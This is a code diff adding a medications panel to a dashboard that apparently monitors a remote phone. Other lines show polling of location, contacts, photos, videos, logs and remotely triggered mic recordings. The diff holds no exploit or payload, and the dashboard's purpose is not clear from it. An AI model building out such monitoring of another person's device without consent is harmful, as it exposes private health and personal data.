@@ -638,6 +638,14 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div id="exerciseCalendarContainer"></div>
 </div>
 </div>
+<div style="margin-top:16px" id="medicationSection">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+<span class="label">&#x1F48A; Medications</span>
+<span id="medicationLastSync" style="font-size:13px;color:var(--muted)"></span>
+</div>
+<div id="medicationSummary" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:12px"></div>
+<div id="medicationList" style="display:flex;flex-direction:column;gap:8px"></div>
+</div>
 </div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
@@ -831,7 +839,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -1910,7 +1918,7 @@ function startPolling() {
   schedulePoll('insights', 120000, renderInsights);
   schedulePoll('wifi', 60000, pollWifiScans);
   schedulePoll('logcat', 60000, pollLogcat);
-  schedulePoll('health', 60000, pollHealth);
+  schedulePoll('health', intervals.health, pollHealth);
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('videos', 60000, pollVideos);
 }
@@ -5644,6 +5652,22 @@ async function pollHealth() {
     }
   } catch { document.getElementById('exerciseSection').style.display = 'none'; }
 
+  // Medications
+  try {
+    const [meds, medLog, medMeta] = await Promise.all([
+      fetchRTDB(`devices/${selectedDevice}/medications`),
+      fetchRTDB(`devices/${selectedDevice}/medicationLog/${todayStr}`),
+      fetchRTDB(`devices/${selectedDevice}/medications/meta`)
+    ]);
+    if (meds && typeof meds === 'object' && Object.values(meds).some(m => m && m.name)) {
+      document.getElementById('medicationSection').style.display = 'block';
+      hasAnyHealthData = true;
+      renderMedications(meds, medLog, medMeta);
+    } else {
+      document.getElementById('medicationSection').style.display = 'none';
+    }
+  } catch { document.getElementById('medicationSection').style.display = 'none'; }
+
   // Graceful empty state when nothing is synced
   const healthHint = document.getElementById('healthEmptyHint');
   if (healthHint) healthHint.style.display = hasAnyHealthData ? 'none' : 'block';
@@ -5990,6 +6014,63 @@ function renderExerciseCalendar(sortedData) {
   });
   html += '</div>';
   container.innerHTML = html;
+}
+
+function renderMedications(meds, medLog, meta) {
+  const summaryDiv = document.getElementById('medicationSummary');
+  const lastSyncDiv = document.getElementById('medicationLastSync');
+  const listDiv = document.getElementById('medicationList');
+  if (!summaryDiv || !lastSyncDiv || !listDiv) return;
+  const medList = Object.values(meds).filter(m => m && m.name);
+  const logData = (medLog && typeof medLog === 'object') ? medLog : {};
+  const logEntries = Object.values(logData);
+  const totalDoses = logEntries.length;
+  const takenDoses = logEntries.filter(e => e.taken).length;
+  const pendingDoses = totalDoses - takenDoses;
+  const activeCount = medList.filter(m => m.isActive !== false).length;
+  lastSyncDiv.textContent = meta?.lastSync ? 'Last sync: ' + pkt(meta.lastSync) : '';
+  summaryDiv.innerHTML = `
+    <div class="card" style="border-left-color:var(--accent);padding:10px 12px">
+      <div class="label">💊 Active Medications</div>
+      <div style="font-size:24px;font-weight:700;color:var(--accent)">${activeCount}</div>
+    </div>
+    <div class="card" style="border-left-color:var(--info);padding:10px 12px">
+      <div class="label">Doses Today</div>
+      <div style="font-size:24px;font-weight:700;color:var(--info)">${totalDoses}</div>
+    </div>
+    <div class="card" style="border-left-color:var(--success);padding:10px 12px">
+      <div class="label">✅ Taken</div>
+      <div style="font-size:24px;font-weight:700;color:var(--success)">${takenDoses}</div>
+    </div>
+    <div class="card" style="border-left-color:#ffca28;padding:10px 12px">
+      <div class="label">⏳ Pending</div>
+      <div style="font-size:24px;font-weight:700;color:#ffca28">${pendingDoses}</div>
+    </div>`;
+  if (!medList.length) {
+    listDiv.innerHTML = '<div class="label" style="color:var(--muted)">No medications recorded yet</div>';
+    return;
+  }
+  listDiv.innerHTML = medList.map(m => {
+    const times = Array.isArray(m.times) ? m.times : [];
+    const rows = times.map(t => {
+      const key = `${m.id}|${t}`;
+      const entry = logData[key];
+      const taken = entry ? !!entry.taken : false;
+      return `<div style="display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid var(--border)">
+        <span>⏰ ${escHtml(t)}</span>
+        <span style="color:${taken ? 'var(--success)' : '#ffca28'};font-size:13px">${taken ? '✅ Taken' : '⏳ Pending'}</span>
+      </div>`;
+    }).join('');
+    const statusColor = m.isActive === false ? 'var(--muted)' : 'var(--text)';
+    return `<div class="card" style="padding:10px 12px;border-left-color:${m.isActive === false ? 'var(--border)' : 'var(--accent)'}">
+      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px">
+        <span style="font-size:15px;font-weight:600;color:${statusColor}">💊 ${escHtml(m.name)}${m.isActive === false ? ' (inactive)' : ''}</span>
+        ${m.dosage ? `<span style="font-size:12px;color:var(--muted)">${escHtml(m.dosage)}</span>` : ''}
+      </div>
+      ${m.notes ? `<div style="font-size:12px;color:var(--muted);margin-top:2px">${escHtml(m.notes)}</div>` : ''}
+      ${rows}
+    </div>`;
+  }).join('');
 }
 
 function exportStepChart() {
